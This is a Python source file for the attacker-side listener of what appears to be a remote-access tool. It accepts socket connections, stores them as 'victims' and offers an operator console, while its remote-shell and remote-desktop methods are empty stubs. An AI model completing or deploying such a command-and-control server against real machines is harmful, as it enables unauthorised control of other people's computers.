import logging
import socket
import sys

import threading
import tkinter as tk

from src.modlues.protocols.victim_dataclass import VictimData
from src.modlues.remote_shell.attacker_rsh import RemoteShellAttackerSide


class Attacker:

    def __init__(self, ip, port):
        self.IP = ip
        self.PORT = port
        self.ADDR = (ip, port)
        self.server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.server.bind(self.ADDR)

        self.connected_clients = list()

        logging.basicConfig(level=logging.DEBUG,format="%(message)s")

    def main(self):
        threading.Thread(target=self.__admin_input).start()
        self.__start_listing()

    def __start_listing(self):
        self.server.listen()
        print(f'LISTENING... ({self.IP}:{self.PORT})')
        try:
            while True:
                conn, addr = self.server.accept()
                print(f"connection from: {addr}")

                threading.Thread(target=self.__on_new_client, args=(conn, addr)).start()

        except Exception as e:
            print(e)
            self.server.close()

    def __on_new_client(self, conn, addr):
        self.connected_clients.append(VictimData(conn, addr))

    def __admin_input(self):
        while True:
            raw_command = input("attacker % ",)
            command_components = raw_command.split(' ')
            command = command_components[0]
            command_args = command_components[1:]

            if raw_command == "client.show":
                self.__show_connected_clients()

    def __show_connected_clients(self):
        print('-' * 20)
        for i, client in enumerate(self.connected_clients, start=1):
            print(f'{i}. {client.addr}')
        print('-' * 20)

    def __choose_client(self):
        pass

    def __start_remote_desktop(self):
        pass

    def __start_remote_shell(self):
        pass
